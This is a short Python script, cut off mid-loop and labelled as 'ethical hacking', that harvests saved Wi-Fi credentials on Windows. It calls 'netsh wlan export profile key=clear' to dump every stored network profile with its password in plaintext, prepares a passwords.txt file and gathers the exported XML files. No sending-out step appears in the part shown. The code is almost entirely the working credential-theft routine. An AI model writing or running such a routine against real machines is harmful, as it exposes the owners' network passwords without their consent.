import subprocess
import os



#create a file
password_file= open('passwords.txt',"w")
password_file.write("Hello! Here are your password files \n\n")
password_file.close()

#Lists
wifi_files=[]
wifi_name=[]
wifi_password=[]

#Use Python to execute a Windows command
command= subprocess.run(["netsh","wlan","export","profile","key=clear"],
                        capture_output=True).stdout.decode()

#Grab current directory
path=os.getcwd()

#Do the Ethical hacking
for filename in os.listdir(path):
    if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
        wifi_files.append(filename)
       